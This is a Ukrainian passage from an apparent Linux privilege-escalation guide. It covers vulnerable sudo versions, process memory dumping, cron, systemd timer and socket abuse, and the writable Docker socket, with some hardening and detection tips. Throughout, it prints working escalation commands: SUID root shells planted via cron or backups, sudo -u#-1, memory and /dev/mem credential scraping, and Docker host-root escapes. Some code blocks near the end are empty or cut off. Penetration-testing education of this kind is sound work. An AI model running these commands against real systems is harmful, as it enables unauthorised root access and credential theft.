### Версія Sudo

На основі вразливих версій sudo, наведених у:

```bash
searchsploit sudo
```

За допомогою цієї команди grep можна перевірити, чи вразлива версія sudo.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

Upstream sudo **1.9.14 through 1.9.17** дозволяє непривілейованим локальним користувачам підвищити привілеї до root за допомогою опції `--chroot`, коли sudo завантажує `/etc/nsswitch.conf` із каталогу, контрольованого користувачем; upstream виправив це у версії **1.9.17p1**. Перевірте кожен виконуваний root-setuid бінарний файл sudo у відповідних шляхах, оскільки `sudo -V` повідомляє лише про бінарний файл, вибраний через `PATH`. Дистрибутиви можуть перенести виправлення до своїх пакетів без зміни рядка версії upstream, тому також перевірте статус пакета від постачальника. Див. [консультацію супроводжувача sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Ось [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) для експлуатації цієї [вразливості](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Перед запуском експлойта переконайтеся, що ваша версія `sudo` вразлива та підтримує функцію `chroot`.  

Докладніше див. оригінальну [консультацію щодо вразливості](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Обхід host-based правил sudo (CVE-2025-32462)

Upstream sudo **1.8.8 through 1.9.17** може перевіряти host-based правила sudoers, використовуючи **ім’я хоста, вказане користувачем** через `sudo -h <host>`, замість **справжнього імені хоста**; upstream виправив це у версії **1.9.17p1**. У вибраному хості користувач усе одно має відповідати запису sudoers. Перевірте виправлення, перенесені постачальником, і альтернативні бінарні файли sudo, а також локальну політику. Див. [консультацію супроводжувача sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Вимоги:
- Вразлива версія sudo
- Правила sudoers для конкретного хоста (хост — не поточне ім’я хоста й не `ALL`)

Приклад шаблону sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Експлуатація через підміну дозволеного хоста:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Якщо розв’язання вибраного імені блокується, перевірте, як це ім’я розв’язується на хості. Сам факт, що ім’я є в журналі або файлі конфігурації, не означає, що його можна розв’язати, а для зміни `/etc/hosts` зазвичай потрібен привілейований доступ на запис.

#### sudo < v1.8.28

Цей [обхід Runas UID у вихідному коді](https://ubuntu.com/security/CVE-2019-14287) вимагає ефективного правила sudo, яке дозволяє виконувати команду від імені користувачів `ALL`, виключаючи root, наприклад `(ALL, !root) /bin/bash`. Викликач також має мати право використовувати це правило, зокрема виконати будь-які вимоги автентифікації. Перевірте рекомендації щодо встановленого пакета: постачальники переносили виправлення до випусків, у яких відображувана версія upstream досі нижча за 1.8.28. Саме по собі правило `!root` або стара версія не підтверджують наявність уразливості. Не перевіряйте привілейовану команду під час пасивного переліку.

```
sudo -u#-1 /bin/bash
```

## Processes

Перегляньте, **які процеси** виконуються, і перевірте, чи не має якийсь із них **більше привілеїв, ніж потрібно** (наприклад, чи не запущено tomcat від імені root?).

```bash
ps aux
ps -ef
top -n 1
```

Завжди перевіряйте, чи не запущені [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md): ви можете зловживати ними для підвищення привілеїв. **Linpeas** виявляє їх, перевіряючи наявність параметра `--inspect` у командному рядку процесу.\
Також **перевірте свої привілеї щодо бінарних файлів процесів** — можливо, ви зможете перезаписати чийсь файл.

### Ланцюжки батьківських і дочірніх процесів між користувачами

Дочірній процес, запущений від імені **іншого користувача**, ніж його батьківський процес, не обов’язково є шкідливим, але це корисний **сигнал для первинного аналізу**. Деякі переходи очікувані (`root` запускає сервісного користувача, менеджери входу створюють процеси сеансів), але незвичні ланцюжки можуть вказувати на обгортки, допоміжні засоби налагодження, механізми закріплення або слабкі межі довіри під час виконання.

Швидка перевірка:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Якщо знайдете неочікуваний ланцюжок, перевірте командний рядок батьківського процесу та всі файли, що впливають на його поведінку (`config`, `EnvironmentFile`, допоміжні скрипти, робочий каталог, аргументи, доступні для запису). У кількох реальних шляхах privesc дочірній процес не можна було змінити, але **конфігурацією, контрольованою батьківським процесом**, або ланцюжком допоміжних скриптів можна було керувати.

### Видалені виконувані файли та відкриті видалені файли

Артефакти часу виконання часто залишаються доступними **навіть після видалення**. Це корисно як для підвищення привілеїв, так і для відновлення доказів із процесу, у якого вже відкриті конфіденційні файли.

Перевірте наявність видалених виконуваних файлів:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Якщо `/proc/<PID>/exe` вказує на `(deleted)`, процес усе ще виконує старий образ бінарного файла з пам’яті. Це вагома причина для розслідування, оскільки:

- видалений виконуваний файл може містити цікаві рядки або облікові дані
- процес, що працює, усе ще може надавати корисні файлові дескриптори
- видалений привілейований бінарний файл може свідчити про нещодавнє втручання або спробу замести сліди

Зберіть список відкритих, але видалених файлів у системі:

```bash
lsof +L1
```

Якщо знайдете цікавий дескриптор, відновіть його безпосередньо:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Це особливо цінно, коли процес досі тримає відкритим видалений секрет, скрипт, експорт бази даних або файл із прапорцем.

### Моніторинг процесів

Для моніторингу процесів можна використовувати такі інструменти, як [**pspy**](https://github.com/DominicBreuker/pspy). Це може бути дуже корисно для виявлення вразливих процесів, які часто запускаються або запускаються за виконання певного набору умов.

#### Linux ProcMon через sudo

[ProcMon для Linux](https://github.com/microsoft/ProcMon-for-Linux) може відстежувати вибрані процеси та системні виклики, а також зберігати трасування у SQLite. Якщо `sudo -l` дозволяє запускати необмежену команду `procmon` із правами root, подумайте, чи може вона спостерігати за вхідними або вихідними даними процесу іншого користувача. Цей дозвіл — лише привід для перевірки: усе залежить від підтримки трасувальника, чинної політики та активності відповідного процесу. Файли трасування можуть містити секрети, тож уважно перевіряйте дозволені до перегляду експорти й не збирайте дані сторонніх процесів.

### Пам’ять процесів

Деякі служби сервера зберігають **облікові дані у відкритому тексті в пам’яті**.\
Зазвичай для читання пам’яті процесів, що належать іншим користувачам, потрібні **права root**, тому це зазвичай корисніше, коли ви вже маєте права root і хочете знайти додаткові облікові дані.\
Однак пам’ятайте: **звичайний користувач може читати пам’ять власних процесів**.

> [!WARNING]
> Зауважте, що нині більшість машин **за замовчуванням забороняють ptrace**, тобто ви не можете дампити інші процеси, що належать вашому непривілейованому користувачу.
>
> Доступність ptrace контролює файл _**/proc/sys/kernel/yama/ptrace_scope**_:
>
> - **kernel.yama.ptrace_scope = 0**: можна налагоджувати всі процеси, якщо вони мають однаковий uid. Саме так ptrace працював традиційно.
> - **kernel.yama.ptrace_scope = 1**: можна налагоджувати лише батьківський процес.
> - **kernel.yama.ptrace_scope = 2**: ptrace може використовувати лише адміністратор, оскільки для цього потрібна capability CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: жоден процес не можна трасувати за допомогою ptrace. Після встановлення цього значення для повторного ввімкнення ptrace потрібне перезавантаження.

Процес із тим самим UID, який на короткий час розблоковує сховище паролів, може бути окремою межею доступу до облікових даних. Якщо трасування дозволено, активний процес, який можна дампити, може розкрити пароль до сховища через системні виклики введення або пам’ять, хоча сам зашифрований файл сховища залишається захищеним. `ptrace_scope=0` — лише одна з необхідних умов: важливі також відповідність облікових даних, можливість дампу цільового процесу, інші модулі безпеки Linux і час життя процесу. Щоб запис зі сховища можна було використати для входу в Unix як root, потрібно окремо перевірити повторне використання облікових даних. Під час звичайного перерахування слід повідомляти про політику та потенційні процеси або шляхи до сховищ, а не перехоплювати введення чи виводити секрети. Див. [документацію ядра щодо Yama](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) і [перевірки доступу ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### Скрипт GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Для заданого ID процесу **maps показує, як пам’ять відображена у віртуальному адресному просторі цього процесу**; також він показує **права доступу для кожної відображеної області**. Псевдофайл **mem відкриває доступ до самої пам’яті процесу**. Із файла **maps** ми дізнаємося, які **області пам’яті доступні для читання**, та їхні зсуви. Використовуючи цю інформацію, ми **переходимо до потрібних позицій у файлі mem і записуємо всі доступні для читання області** у файл.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` надає доступ до **фізичної** пам’яті системи, а не до віртуальної. Простір віртуальних адрес ядра доступний через /dev/kmem.\
Зазвичай, читати `/dev/mem` можуть лише **root** і група **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### Crontab UI (alseambusher), що працює від root — підвищення привілеїв через вебпланувальник

Якщо вебпанель «Crontab UI» (alseambusher/crontab-ui) працює від root і прослуховує лише loopback, до неї все одно можна підключитися через локальне перенаправлення портів SSH і створити привілейоване завдання для підвищення привілеїв.<sup>[[1]](#references)[[4]](#references)</sup>

Типовий ланцюжок
- Виявити порт, доступний лише через loopback (наприклад, 127.0.0.1:8000), і realm Basic-Auth за допомогою `ss -ntlp` / `curl -v localhost:8000`
- Знайти облікові дані в операційних артефактах:
  - резервні копії/скрипти з `zip -P <password>`
  - модуль systemd з `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Створити тунель і увійти:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Створіть завдання з високими привілеями та негайно запустіть його (створює SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Використайте це:
```bash
/tmp/rootshell -p   # root shell
```

Зміцнення захисту
- Не запускайте Crontab UI від root; використовуйте окремого користувача з мінімальними дозволами
- Прив’яжіть до localhost і додатково обмежте доступ через firewall/VPN; не використовуйте паролі повторно
- Не вбудовуйте секрети у файли unit; використовуйте сховища секретів або EnvironmentFile, доступний лише root
- Увімкніть аудит/логування запусків завдань на вимогу

Перевірте, чи є вразливі заплановані завдання. Можливо, ви зможете скористатися скриптом, який запускається від root (вразливість із wildcard? можна змінити файли, які використовує root? використати symlinks? створити в каталозі, який використовує root, певні файли?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Якщо використовується `run-parts`, перевірте, файли з якими назвами справді буде виконано:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Це допомагає уникнути хибнопозитивних результатів. Каталог із періодичними завданнями, доступний для запису, корисний лише тоді, коли ім’я вашого файлу payload відповідає локальним правилам `run-parts`.

### Ін’єкція в арифметичне розширення Bash у парсерах логів cron

Bash може інтерпретувати недовірений текст як арифметичний вираз. У певних контекстах Bash індекс масиву всередині такого виразу може виконати підстановку команди. Якщо привілейований cron-парсер вставляє контрольований зловмисником текст із логу в таке арифметичне порівняння, підстановка може виконатися з правами парсера.<sup>[[22]](#references)</sup> Це залежить від точного виразу Bash і його версії; сам по собі рядок `$(...)0` у розгорнутій змінній не є надійним прикладом повторного обчислення.

Вхідні дані також можуть надходити з метаданих файлу або іншого поля, зчитаного з доступного користувачеві для запису розташування. Наприклад, привілейований скрипт очищення, який зчитує тег `Producer` зображення й порівнює його за допомогою `[[ "$producer" -eq "expected" ]]`, виконує арифметичне порівняння, хоча змінну взято в лапки. З’ясуйте, від чийого імені запускається заплановане завдання, які файли можуть містити цей тег, які перетворення застосовуються до порівняння та як саме поводиться Bash. Для текстових міток використовуйте порівняння рядків; для чисел перевіряйте, що вхідні дані містять лише десяткові цифри, перш ніж виконувати арифметичні операції. Див. [правила арифметики Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Типовий вразливий шаблон:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Безпечна локальна перевірка механізму індексації масиву (без привілейованого процесу чи змін файлів):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Перевірте фактичний скрипт, запланований до запуску, і буквальний шлях до файлу, який він відкриває. Навіть якщо файл журналу не доступний для запису, користувач, який може записувати до його батьківського каталогу без sticky bit і проходити через нього, може замінити запис каталогу; `namei -l` допоможе розрізнити ці дозволи. Інший доступний для запису шлях до журналу, недоступний для читання планувальник або парсер, який не обчислює це поле як арифметичний вираз Bash, не підтверджують цю можливість.

### Перезапис cron-скрипту та symlink

Якщо **ви можете змінити cron-скрипт**, який виконується від імені root, то дуже легко отримати shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Якщо скрипт, який запускається від імені root, використовує **каталог, до якого ви маєте повний доступ**, може бути корисно видалити цей каталог і **створити замість нього каталог-символічне посилання на інший**, у якому міститься скрипт під вашим контролем.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Перевірка symlink і безпечніша робота з файлами

Перевіряючи привілейовані скрипти/бінарні файли, які читають або записують файли за шляхом, з’ясуйте, як вони обробляють посилання:

- `stat()` переходить за symlink і повертає метадані цільового об’єкта.
- `lstat()` повертає метадані самого посилання.
- `readlink -f` і `namei -l` допомагають визначити кінцеву ціль і показують права доступу для кожного компонента шляху.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Для захисників/розробників безпечніші способи протидії трюкам із symlink включають:

- `O_EXCL` з `O_CREAT`: завершує операцію помилкою, якщо шлях уже існує (блокує попередньо створені зловмисником посилання/файли).
- `openat()`: працює відносно дескриптора файлу довіреного каталогу.
- `mkstemp()`: атомарно створює тимчасові файли з безпечними правами доступу.

### Бінарні файли cron із власним підписом і записуваними даними

Звичайний користувач, який може записувати дані до точного бінарного файла, що запускається завданням cron від root, може перетнути межу привілеїв, але перевірка власного підпису може відхилити непідписану заміну. У задокументованому випадку ELF-файл, власником якого був root, мав режим `0760`, що дозволяло учаснику його групи записувати до нього, а власнику root — виконувати його. Видимий трасувальник процесів показав, що `objcopy` витягав `.text_sig` перед тим, як завдання запускало бінарний файл; повний скрипт перевірки був недоступний для читання.<sup>[[2]](#references)</sup>

Успішна заміна була підписана за допомогою leaked приватного матеріалу для підпису та ELF signer. У [документації формату](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) описано секцію підпису, похідну від `.text` виконуваного файла. Саме додавання сертифіката або відповідного рядка до `.text_sig` не підтверджує, що цього достатньо для невидимого механізму перевірки. Перш ніж робити висновок, що записуваний підписаний бінарний файл можна експлуатувати, перевірте фактичний шлях, який запускається за розкладом, ефективні права на запис, запуск від root і політику перевірки. Сама наявність секції `.text_sig` — лише привід для перевірки.

### Часті завдання cron

Ви можете відстежувати процеси, щоб шукати ті, що запускаються кожні 1, 2 або 5 хвилин. Можливо, ви зможете цим скористатися та підвищити привілеї.

Наприклад, щоб **відстежувати кожні 0.1 с протягом 1 хвилини**, **сортувати за кількістю запусків команд від меншої до більшої** та видалити команди, які запускалися найчастіше, можна виконати:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**You can also use** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (він відстежуватиме та перелічуватиме кожен запущений процес).

### Резервні копії root, що зберігають біти режиму, встановлені атакувальником (pg_basebackup)

Якщо cron, що працює від імені root, запускає `pg_basebackup` (або будь-яке рекурсивне копіювання) для каталогу бази даних, до якого ви маєте доступ на запис, можна розмістити **SUID/SGID-бінарний файл**, який буде скопійовано повторно як **root:root** із тими самими бітами режиму до вихідного каталогу резервної копії.<sup>[[26]](#references)</sup>

Типовий процес пошуку (від імені користувача БД із низькими привілеями):
- Використайте `pspy`, щоб виявити cron від root, який щохвилини запускає щось на кшталт `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/`.
- Переконайтеся, що каталог вихідного кластера (наприклад, `/var/lib/postgresql/14/main`) доступний вам для запису, а каталог призначення (`/opt/backups/current`) після виконання завдання належить root.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Це працює, оскільки `pg_basebackup` зберігає біти режиму файлів під час копіювання кластера; коли його запускає root, файли призначення отримують **власника root + вибрані зловмисником біти SUID/SGID**. Будь-яка подібна привілейована процедура резервного копіювання чи копіювання, яка зберігає дозволи й записує файли в каталог для виконуваних файлів, є вразливою.

### Невидимі завдання cron

Можна створити завдання cron, **додавши символ повернення каретки після коментаря** (без символу нового рядка), і завдання cron працюватиме. Приклад (зверніть увагу на символ повернення каретки):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Щоб виявити такий тип прихованого запису, перевірте файли cron за допомогою інструментів, які показують керівні символи:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Служби

### Файли _.service_, доступні для запису

Перевірте, чи можете ви записувати в будь-який файл `.service`. Якщо так, ви **можете змінити його**, щоб він **запускав** ваш **backdoor, коли** службу **запускають**, **перезапускають** або **зупиняють** (можливо, доведеться дочекатися перезавантаження машини).\
Наприклад, створіть backdoor у файлі .service за допомогою **`ExecStart=/tmp/script.sh`**

### Двійкові файли служб, доступні для запису

Майте на увазі: якщо у вас є **права на запис до двійкових файлів, які запускають служби**, ви можете замінити їх на backdoor, щоб він запускався під час повторного запуску служб.

### systemd PATH — відносні шляхи

Переглянути PATH, який використовує **systemd**, можна за допомогою:

```bash
systemctl show-environment
```

Якщо ви виявите, що можете **записувати** в будь-яку з папок у шляху, можливо, вам вдасться **підвищити привілеї**. Потрібно шукати **відносні шляхи, які використовуються у файлах конфігурації служб**, наприклад:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

Потім створіть **виконуваний файл** із **такою самою назвою, як у бінарного файла з відносним шляхом**, у доступній для запису папці systemd PATH. Коли службі накажуть виконати вразливу дію (**Start**, **Stop**, **Reload**), буде виконано ваш **backdoor** (непривілейовані користувачі зазвичай не можуть запускати/зупиняти служби, але перевірте, чи можете скористатися `sudo -l`).

**Дізнайтеся більше про служби за допомогою `man systemd.service`.**

## **Таймери**

**Таймери** — це файли модулів systemd із назвами, що закінчуються на `**.timer**`, які керують файлами `**.service**` або подіями. **Таймери** можна використовувати замість cron: вони мають вбудовану підтримку календарних і монотонних подій часу та можуть виконуватися асинхронно.

Перерахувати всі таймери можна так:

```bash
systemctl list-timers --all
```

### Таймери, доступні для запису

Якщо ви можете змінити таймер, то можете змусити його виконати наявний об’єкт systemd.unit (наприклад, `.service` або `.target`).

```bash
Unit=backdoor.service
```

У документації можна прочитати, що таке Unit:

> Юніт, який потрібно активувати після спрацювання цього таймера. Аргументом є назва юніта без суфікса «.timer». Якщо значення не вказано, за замовчуванням активується служба з такою самою назвою, як у юніта таймера, але без суфікса. (Див. вище.) Рекомендується, щоб назви активованого юніта та юніта таймера були однаковими, за винятком суфікса.

Отже, щоб зловживати цим дозволом, потрібно:

- Знайти якийсь юніт systemd (наприклад, `.service`), який **виконує бінарний файл, доступний для запису**
- Знайти якийсь юніт systemd, який **виконує відносний шлях**, і мати **права на запис до PATH systemd** (щоб підмінити цей виконуваний файл)

**Докладніше про таймери: `man systemd.timer`.**

### **Увімкнення таймера**

Щоб увімкнути таймер, потрібні права root. Виконайте:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

Зверніть увагу: **таймер** **активується**, якщо створити символічне посилання на нього в `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Сокети

Unix Domain Sockets (UDS) забезпечують **взаємодію процесів** на одній або різних машинах у межах клієнт-серверних моделей. Вони використовують стандартні файли дескрипторів Unix для взаємодії між комп’ютерами й налаштовуються за допомогою файлів `.socket`.<sup>[[14]](#references)</sup>

Сокети можна налаштовувати за допомогою файлів `.socket`.

**Дізнайтеся більше про сокети за допомогою `man systemd.socket`.** У цьому файлі можна налаштувати кілька цікавих параметрів:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Ці параметри різні, але загалом вони **вказують, де сокет слухатиме** (шлях до файла сокета AF_UNIX, IPv4/6 та/або номер порту для прослуховування тощо).
- `Accept`: Приймає булеве значення. Якщо **true**, для кожного вхідного з’єднання **створюється екземпляр служби**, якому передається лише сокет з’єднання. Якщо **false**, усі сокети, що прослуховуються, **передаються запущеному модулю служби**, і для всіх з’єднань створюється лише один модуль служби. Це значення ігнорується для сокетів датаграм і FIFO, де один модуль служби безумовно обробляє весь вхідний трафік. **За замовчуванням — false**. З міркувань продуктивності рекомендується писати нові демони лише так, щоб вони працювали з `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Приймають один або кілька командних рядків, які **виконуються до** або **після** створення та прив’язування сокетів/FIFO для прослуховування відповідно. Перший елемент командного рядка має бути абсолютним ім’ям файла, за яким ідуть аргументи процесу.
- `ExecStopPre`, `ExecStopPost`: Додаткові **команди**, які **виконуються до** або **після** закриття та видалення сокетів/FIFO для прослуховування відповідно.
- `Service`: Визначає назву модуля **служби**, який потрібно **активувати** у разі **вхідного трафіку**. Це налаштування дозволено лише для сокетів із Accept=no. За замовчуванням використовується служба з тією самою назвою, що й сокет (із заміною суфікса). У більшості випадків цей параметр не потрібен.

### Доступні для запису файли .socket

Якщо знайдете файл `.socket`, **доступний для запису**, на початку секції `[Socket]` можна **додати** щось на кшталт: `ExecStartPre=/home/kali/sys/backdoor`, і backdoor буде виконано перед створенням сокета. Тому, **ймовірно, доведеться дочекатися перезавантаження машини.**\
_Зверніть увагу: система має використовувати конфігурацію цього файла сокета, інакше backdoor не буде виконано_

### Активація сокета + доступний для запису шлях до модуля (створення відсутньої служби)

Ще одне небезпечне неправильне налаштування:

- модуль сокета з `Accept=no` і `Service=<name>.service`
- зазначений модуль служби відсутній
- зловмисник може записувати в `/etc/systemd/system` (або інший шлях пошуку модулів)

У такому разі зловмисник може створити `<name>.service`, а потім надіслати трафік до сокета, щоб systemd завантажив нову службу та виконав її від імені root.

Короткий перебіг дій:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### Записуваний сокет Docker

Сокет Docker, який часто розташований за адресою `/var/run/docker.sock`, — це критично важливий файл, який слід захистити. За замовчуванням він доступний для запису користувачу `root` і учасникам групи `docker`. Наявність доступу на запис до цього сокета може призвести до підвищення привілеїв. Нижче наведено пояснення, як це зробити, а також альтернативні методи на випадок, якщо Docker CLI недоступний.

#### **Підвищення привілеїв за допомогою Docker CLI**

Якщо у вас є доступ на запис до сокета Docker, ви можете підвищити привілеї за допомогою таких команд:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

Ці команди дають змогу запустити контейнер із root-рівневим доступом до файлової системи хоста.

#### **Безпосереднє використання Docker API**

Якщо Docker CLI недоступний, Docker socket усе одно можна використати через raw HTTP поверх Unix socket. Найнадійніший спосіб:

- створити довготривалий допоміжний контейнер із bind mount кореневого каталогу хоста
- запустити його
- створити в цьому допоміжному контейнері екземпляр `exec`
- запустити екземпляр `exec` і отримати вивід через API

**Список образів Docker**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**Створіть і запустіть допоміжний контейнер**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**Створіть екземпляр exec**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**Запустіть екземпляр exec і прочитайте вивід**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

Цей шаблон зазвичай надійніший, ніж спроби вручну керувати `attach` за допомогою `socat` або `nc -U`. Коли ви зможете створити допоміжний контейнер із `/:/host`, можна використовувати додаткові екземпляри `exec`, щоб читати файли на кшталт `/host/root/...`, додавати SSH-ключі до `/host/root/.ssh` або змінювати файли запуску хоста.

## **D-Bus**

D-Bus — це складна **система міжпроцесної взаємодії (IPC)**, яка дає змогу програмам ефективно взаємодіяти й обмінюватися даними. Створена з урахуванням сучасних систем Linux, вона пропонує надійний механізм для різних форм взаємодії між програмами.<sup>[[16]](#references)</sup>

Система є універсальною: вона підтримує базову IPC, що спрощує обмін даними між процесами, подібно до **розширених доменних сокетів UNIX**. Крім того, вона допомагає транслювати події або сигнали, забезпечуючи безперешкодну інтеграцію компонентів системи. Наприклад, сигнал від демона Bluetooth про вхідний дзвінок може змусити музичний програвач вимкнути звук, покращуючи взаємодію з користувачем. Також D-Bus підтримує систему віддалених об’єктів, спрощуючи запити до служб і виклики методів між програмами та оптимізуючи процеси, які традиційно були складними.

D-Bus використовує **модель дозволу/заборони** для керування дозволами на повідомлення (виклики методів, надсилання сигналів тощо) на основі сукупної дії відповідних правил політики. Ці політики визначають взаємодію з шиною та можуть дозволити підвищення привілеїв через використання цих дозволів.

Нижче наведено приклад такої політики з `/etc/dbus-1/system.d/wpa_supplicant.conf`, яка визначає дозволи для користувача root володіти `fi.w1.wpa_supplicant1`, надсилати йому повідомлення та отримувати їх від нього.

Політики без указаного користувача або групи застосовуються до всіх, а політики контексту «default» — до всіх, на кого не поширюються інші конкретні політики.

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**Дізнайтеся, як збирати інформацію про комунікацію D-Bus та експлуатувати її тут:**

```bash
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state

```

Якщо активний запис `/etc/inetd.conf` запускає GNU Inetutils `telnetd` від root, перевірте налаштовану версію бінарного файла та локальний слухач, навіть якщо порт прив’язаний лише до loopback. У GNU Inetutils версій від 1.9.3 до 2.7 була [обхід автентифікації Telnet](https://seclists.org/oss-sec/2026/q1/89), за якого передане клієнтом значення `USER` потрапляло до `login -f` (CVE-2026-24061). Процес або рядок версії є лише індикатором; перш ніж вважати систему вразливою, перевірте наявність виправлення від постачальника та фактичний daemon. Докладніше див. у [посібнику з Telnet](../../../network-services-pentesting/pentesting-telnet.md).

### Швидке первинне сортування фільтрації вихідного трафіку

Якщо хост може виконувати команди, але зворотні з’єднання не працюють, швидко відокремте фільтрацію DNS, транспорту, проксі та маршрутів:

```bash

# Route/path clue for 443 filtering

# Proxy-enforced environments and remote-DNS SOCKS testing

```

### Відкриті порти

Завжди перевіряйте мережеві служби, що працюють на машині, з якими вам не вдалося взаємодіяти до отримання доступу до неї:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
